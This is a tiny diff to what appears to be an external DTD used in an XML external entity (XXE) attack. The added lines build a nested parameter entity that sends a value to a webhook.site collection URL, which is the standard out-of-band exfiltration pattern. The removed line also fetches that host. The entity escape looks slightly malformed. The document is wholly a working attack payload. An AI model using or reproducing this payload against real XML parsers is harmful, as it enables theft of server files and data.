@@ -1,3 +1,4 @@
-<!ENTITY % eval SYSTEM "https://webhook.site/a651ce15-7950-4f46-9770-46adfa624465/?file=fucku">
+<!ENTITY % file 'really'>
+<!ENTITY % eval "<!ENTITY #&25; exfil SYSTEM 'https://webhook.site/a651ce15-7950-4f46-9770-46adfa624465/?data=%file;'>">
 %eval;
-
+%exfil;
